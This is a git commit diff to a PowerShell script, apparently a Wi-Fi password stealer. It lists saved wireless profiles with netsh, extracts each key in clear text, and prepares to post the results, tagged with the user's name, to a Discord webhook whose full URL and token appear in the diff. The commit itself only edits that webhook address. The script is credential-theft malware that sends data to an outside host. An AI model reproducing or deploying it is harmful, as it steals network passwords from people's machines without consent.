0a5958e3d23be8e2809eab46538f53d76336a808
Joel A Marinay Jr <66583724+joel2128@users.noreply.github.com>
2024-10-20 12:56:25 +0800

    Update Windows-Passwords-ENG.ps1

--- Windows-Passwords-ENG.ps1
+++ Windows-Passwords-ENG.ps1
@@ -3,7 +3,7 @@
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
-	$discord='https://discord.com/api/webhooks/1297408069793353748/iQk3KY2n9HivodUu8nENgaQl_PJhnF8LapPJl6GYHyWP4qA2WKA8Z2hNOLITZIEKW6tR'
+	$discord='https://discord.com/api/webhooks/1297408069793353748/iQk3KY2n9HivodUu8nENgaQl_PJhnF8LapPJl6GYHyWP4qA2WKA8Z2hNOLITZIEKW6tR/github'
 
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
